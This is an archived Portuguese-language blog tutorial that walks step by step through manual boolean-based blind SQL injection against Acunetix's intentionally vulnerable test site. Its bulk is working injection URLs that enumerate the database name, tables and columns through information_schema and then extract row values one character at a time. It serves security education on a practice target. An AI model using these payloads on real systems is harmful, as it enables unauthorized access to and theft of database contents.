# Blind SQL Injection

- **Source URL:** https://medium.com/@r3du/blind-sql-injection-53c72f9e019a?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20251126142244/https://medium.com/@r3du/blind-sql-injection-53c72f9e019a
- **Fetched:** 2026-11-22
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/3491 (id 3491)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Blind SQL Injection

Nesse artigo, irei demonstrar o SQL injection do tipo ***blind*** de forma didática e manual. O conteúdo é para estudo, afinal realizar o Blind SQL manualmente pode ser extremamente desafiador.

## O que é?

O SQL Injection é a capacidade do atacante inserir códigos SQL dentro da aplicação, que são lidos e interpretados por ela. o ***Blind SQL Injection*** depende do atacante ser capaz de interpretar o comportamento da aplicação que esta sendo explorada isso por que ela não retorna erros, e você depende de realizar um dialogo que só existe sim e não como resposta.

## Como encontrar?

Para encontrar essa vulnerabilidade você precisa realizar uma pergunta logica, que vai retornar ***true*** ou ***false*** e entender como será o comportamento caso o retorno seja ***true*** e o comportamento para ***false***. Não existe uma regra, pode ser um erro, uma mensagem ou até exibir ou não dados na interface, vai depender de como a aplicação foi desenvolvida.

## Explorando

Para explicar a exploração vou utilizar o Vulnweb da Acunetix “[http://testphp.vulnweb.com/product.php?pic=1](http://testphp.vulnweb.com/product.php?pic=1)”

Comportamento analisado da pagina:

```
http://testphp.vulnweb.com/product.php?pic=1 and true%23
http://testphp.vulnweb.com/product.php?pic=1 and false%23
```
- Se a consulta é verdadeira ele exibe o conteúdo da página.
- Se a consulta é falsa a página fica em branco.

Após verificar a vulnerabilidade e achar o padrão de consulta, vamos iniciar a exploração, o que é bem trabalhoso é um loop de descobrir o tamanho da ***string*** é o nome caracter a caracter.

### Descobrir o tamanho do nome do database

O primeiro passo é descobrir o tamanho da ***string*** de nome do database, isso pode ser feito com a função length:

```
http://testphp.vulnweb.com/product.php?pic=1 and length(database()) = 1%23
http://testphp.vulnweb.com/product.php?pic=1 and length(database()) = 2%23
...
http://testphp.vulnweb.com/product.php?pic=1 and length(database()) = 6%23
```
Quando pergunta se o tamanho do database é 6 ele exibe o conteúdo da página, demonstrando que o nome do banco de dados tem 6 caracteres.

### Descobrir agora descobrir o nome do database

Agora a pergunta é na posição X o caractere é **“a”**? se não é **“b”**? assim por diante ate achar os 6 caracteres que forma o nome da base de dados.

Para fazer essa pergunta usa o método ***ascii()*** para comparar e o método ***substring()*** para extrair o caractere.

**A consulta ficaria:**

- *Caracter na posição 1 é o a?* ***ascii(substring(database(), 1, 1)) = 97***
- *Caracter na posição 1 é o b?* ***ascii(substring(database(), 1, 1)) = 98***
- *Caracter na posição 1 é o c?* ***ascii(substring(database(), 1, 1)) = 99***

Após encontrar o caractere da posição 1 a pergunta iria para posição 2 e assim até o tamanho do database, nesse exemplo 6

- *Caracter na posição 2 é o a?* ***ascii(substring(database(), 2, 1)) = 97***
- *Caracter na posição 2 é o b?* ***ascii(substring(database(), 2, 1)) = 98***
- *Caracter na posição 2 é o c?* ***ascii(substring(database(), 2, 1)) = 99***

No caso do [http://testphp.vulnweb.com/product.php?pic=1](http://testphp.vulnweb.com/product.php?pic=1) deu ***true*** (a página carregou) com as seguintes perguntas

```
http://testphp.vulnweb.com/product.php?pic=1 and ascii(substring(database(), 1, 1)) = 97# a
http://testphp.vulnweb.com/product.php?pic=1 and ascii(substring(database(), 2, 1)) = 99# c
http://testphp.vulnweb.com/product.php?pic=1 and ascii(substring(database(), 3, 1)) = 117# u
http://testphp.vulnweb.com/product.php?pic=1 and ascii(substring(database(), 4, 1)) = 97# a
http://testphp.vulnweb.com/product.php?pic=1 and ascii(substring(database(), 5, 1)) = 114# r
http://testphp.vulnweb.com/product.php?pic=1 and ascii(substring(database(), 6, 1)) = 116# t
```
Ou seja o nome do database é *acuart*

Outra maneira de descobrir seria por brute-force, onde você perguntaria por nomes completos de banco de dados e não caractere a caractere.

Nesse caso a consulta seria assim:

`https://testphp.vulnweb.com/product.php?pic=1 and database() = char(097, 099,117,097,114,116)%23`
### Agora tem que descobrir a quantidade de caracteres das tabelas

Como mencionei é um loop, onde agora vou descobrir o tamanho dos caracteres de nome das tabelas, e depois caractere a caractere vou descobrir o nome.

Vale ressaltar para essa consulta que o 44 é a virgula, isso pois vou usar o método ***group\_concat()*** para concatenar os nomes das tabelas e essa concatenação separa a tabela1 da tabela2 por virgula.

A partir de agora além de perguntar o alfabeto a cada caractere deve perguntar pela virgula que vai separar uma tabela da outra e uma coluna da outra.

A pergunta ficaria ***length(group\_concat(table\_name)) = X,*** onde o X é a pergunta da quantidade de caracteres e teria o where para a tabela *acuart.*

```
http://testphp.vulnweb.com/product.php?pic=1 and (select length(group_concat(table_name)) = 1 from information_schema.tables where table_schema="acuart")
http://testphp.vulnweb.com/product.php?pic=1 and (select length(group_concat(table_name)) = 2 from information_schema.tables where table_schema="acuart")
...
http://testphp.vulnweb.com/product.php?pic=1 and (select length(group_concat(table_name)) = 62 from information_schema.tables where table_schema="acuart")
```
Detalhe importantíssimo, nessa pergunta tem o parênteses para se tornar uma condicional *pic=1 and* ***(select length…)*** caso não coloque a consulta vai falhar.

### **A precisa descobrir os nomes das tabelas**

Para isso precisa fazer novamente a pergunta caractere a caractere, e tambem encontrar a virgula, que separa o nome de uma tabela da outra. A maneira de fazer a pergunta é bem parecida com a para descobrir o nome do database.

A consulta vai ser *ascii(substring( (select group\_concat(table\_name) from information\_schema.tables where table\_schema=”acuart”) ,posição , 1)) = ascii\_do\_caractere*

Após descobrir posição a posição até achar a virgula, o nome da primeira tabela é ***artists***.

```
https://testphp.vulnweb.com/product.php?pic=1 and ascii(substring( (select group_concat(table_name) from information_schema.tables where table_schema="acuart") ,1 , 1)) = 97#  a
https://testphp.vulnweb.com/product.php?pic=1 and ascii(substring( (select group_concat(table_name) from information_schema.tables where table_schema="acuart") ,2 , 1)) = 114# r
https://testphp.vulnweb.com/product.php?pic=1 and ascii(substring( (select group_concat(table_name) from information_schema.tables where table_schema="acuart") ,3 , 1)) = 116# t
https://testphp.vulnweb.com/product.php?pic=1 and ascii(substring( (select group_concat(table_name) from information_schema.tables where table_schema="acuart") ,4 , 1)) = 105# i
https://testphp.vulnweb.com/product.php?pic=1 and ascii(substring( (select group_concat(table_name) from information_schema.tables where table_schema="acuart") ,5 , 1)) = 115# s
https://testphp.vulnweb.com/product.php?pic=1 and ascii(substring( (select group_concat(table_name) from information_schema.tables where table_schema="acuart") ,6 , 1)) = 116# t
https://testphp.vulnweb.com/product.php?pic=1 and ascii(substring( (select group_concat(table_name) from information_schema.tables where table_schema="acuart") ,7 , 1)) = 115# s
https://testphp.vulnweb.com/product.php?pic=1 and ascii(substring( (select group_concat(table_name) from information_schema.tables where table_schema="acuart") ,8 , 1)) = 44#  ,
```
### Agora tem que descobrir a quantidade de caracteres das colunas

Novamente vou realizar a concatenação, agora das colunas para descobrir a quantidade de caracteres tem. a consulta vai ficar *and (select length(group\_concat(column\_name)) = X from information\_schema.columns where table\_schema=”acuart” and table\_name=”artists”)*

A quantidade de caracteres foi de 21 para retornar o *true.*

`http://testphp.vulnweb.com/product.php?pic=1 and (select length(group_concat(column_name)) = 21 from information_schema.columns where table_schema="acuart" and table_name="artists")`
### Agora descobrir os nomes das colunas

Novamente percorrer posição a posição, perguntando caractere por caractere e até achar o 44.

A pergunta fica *ascii(substring( (select group\_concat(column\_name) from information\_schema.columns where table\_schema=”acuart” and table\_name=”artists”) ,Posição , 1)) = ascii\_do\_caracter*

O nome da primeira coluna é *artist\_id*

```
https://testphp.vulnweb.com/product.php?pic=1 and ascii(substring( (select group_concat(column_name) from information_schema.columns where table_schema="acuart" and table_name="artists") ,1 , 1)) = 97#  a
https://testphp.vulnweb.com/product.php?pic=1 and ascii(substring( (select group_concat(column_name) from information_schema.columns where table_schema="acuart" and table_name="artists") ,2 , 1)) = 114# r
https://testphp.vulnweb.com/product.php?pic=1 and ascii(substring( (select group_concat(column_name) from information_schema.columns where table_schema="acuart" and table_name="artists") ,3 , 1)) = 116# t
https://testphp.vulnweb.com/product.php?pic=1 and ascii(substring( (select group_concat(column_name) from information_schema.columns where table_schema="acuart" and table_name="artists") ,4 , 1)) = 105# i
https://testphp.vulnweb.com/product.php?pic=1 and ascii(substring( (select group_concat(column_name) from information_schema.columns where table_schema="acuart" and table_name="artists") ,5 , 1)) = 115# s
https://testphp.vulnweb.com/product.php?pic=1 and ascii(substring( (select group_concat(column_name) from information_schema.columns where table_schema="acuart" and table_name="artists") ,6 , 1)) = 116# t
https://testphp.vulnweb.com/product.php?pic=1 and ascii(substring( (select group_concat(column_name) from information_schema.columns where table_schema="acuart" and table_name="artists") ,7 , 1)) = 95#  _
https://testphp.vulnweb.com/product.php?pic=1 and ascii(substring( (select group_concat(column_name) from information_schema.columns where table_schema="acuart" and table_name="artists") ,8 , 1)) = 105# i
https://testphp.vulnweb.com/product.php?pic=1 and ascii(substring( (select group_concat(column_name) from information_schema.columns where table_schema="acuart" and table_name="artists") ,9 , 1)) = 100# d
https://testphp.vulnweb.com/product.php?pic=1 and ascii(substring( (select group_concat(column_name) from information_schema.columns where table_schema="acuart" and table_name="artists") ,10 , 1)) = 44# ,
```
### Finalmente extrair os dados

Para realizar a extração de dados é bem mais simples.

- A coluna vai ser a ***artist\_id***
- A tabela vai ser a ***artists***
- E nesse caso sei que o ***artist\_id*** é numérico, porem no mundo real pode ser alfanuméricos.

A consulta fica *(ascii(substring((select artist\_id from artists limit 0,1),1 ,1)) = valor)*

Os valores da coluna ***artist\_id*** são os ids 1,2 e 3 ou em ascii 49,50 e 51.

```
https://testphp.vulnweb.com/product.php?pic=1 and (ascii(substring((select artist_id from artists limit 0,1),1 ,1)) = 49)
https://testphp.vulnweb.com/product.php?pic=1 and (ascii(substring((select artist_id from artists limit 1,1),1 ,1)) = 50)
https://testphp.vulnweb.com/product.php?pic=1 and (ascii(substring((select artist_id from artists limit 2,1),1 ,1)) = 51)
```
## Conclusão

O SQL Injection do tipo blind é extremamente difícil e complexo de ser feito de maneira manual, esse artigo foi focado em compartilhar conhecimento, pois existem ferramentas que irão realizar essa tarefa de maneira automática, e tem uma taxa de sucesso ainda maior caso você já tenha feito uma analise manual e informe qual campo é vulnerável.
